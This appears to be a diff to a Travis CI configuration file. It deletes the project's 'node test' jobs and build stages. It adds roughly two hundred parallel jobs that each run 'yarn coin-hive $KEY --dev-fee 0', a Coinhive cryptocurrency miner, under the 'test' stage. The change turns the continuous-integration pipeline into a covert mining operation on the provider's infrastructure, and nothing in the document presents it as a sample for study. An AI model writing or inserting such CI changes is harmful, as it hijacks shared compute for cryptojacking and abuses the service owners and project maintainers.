@@ -25,305 +25,204 @@ branches:
 jobs:
   include:
     - stage: test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-    - script: node test
-      script: node test
-      script: node test
-      script: node test
-      script: node test
-      script: node test
-      script: node test
-    - stage: test2
-      script:
-        - node test
-        - node test
-        - yarn functions:install
-        - yarn build- stage: test3
-    - stage: test3
-      script:
-        - node test
-        - node test
-        - yarn functions:install
-        - yarn build
-    - stage: test4
-      script:
-        - node test
-        - node test
-        - yarn functions:install
-        - yarn build
-    - stage: test5
-      script:
-        - node test
-        - node test
-        - yarn functions:install
-        - yarn build
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
 
 stages:
   - test
-  - test2
-  - test3
-  - test4
-  - test5
